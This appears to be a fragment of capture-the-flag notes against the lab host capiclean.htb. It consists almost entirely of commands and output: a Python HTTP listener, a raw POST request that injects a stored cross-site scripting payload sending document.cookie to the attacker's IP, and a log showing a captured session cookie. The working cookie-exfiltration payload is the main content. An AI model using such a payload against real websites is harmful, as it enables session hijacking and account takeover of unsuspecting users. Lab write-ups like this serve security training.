
starting `python3 -m http-server 8000`

```http

```

```sh
┌──(kali㉿kali)-[~]
└─$ python3 -m http.server 8000
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...

10.10.11.12 - - [12/Apr/2024 00:10:31] "GET /dog.jpg HTTP/1.1" 200 -    
```

```http
POST /sendMessage HTTP/1.1
Host: capiclean.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 186
Origin: http://capiclean.htb
Connection: close
Referer: http://capiclean.htb/quote
Upgrade-Insecure-Requests: 1
DNT: 1
Sec-GPC: 1

service=Carpet+Cleaning<img src='a' onerror='var i=new Image;i.src="http://10.10.14.156:8000/?"%2bdocument.cookie;'>&service=Tile+%26+Grout&service=Office+Cleaning&email=mail%40mail.mail
```

```sh
┌──(kali㉿kali)-[~]
└─$ python3 -m http.server 8000
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...

10.10.11.12 - - [12/Apr/2024 00:18:51] "GET /?session=eyJyb2xlIjoiMjEyMzJmMjk3YTU3YTVhNzQzODk0YTBlNGE4MDFmYzMifQ.ZhheTw.QsRbIz2g1trIwU9-oEXPTcumVJk HTTP/1.1" 200 -

```

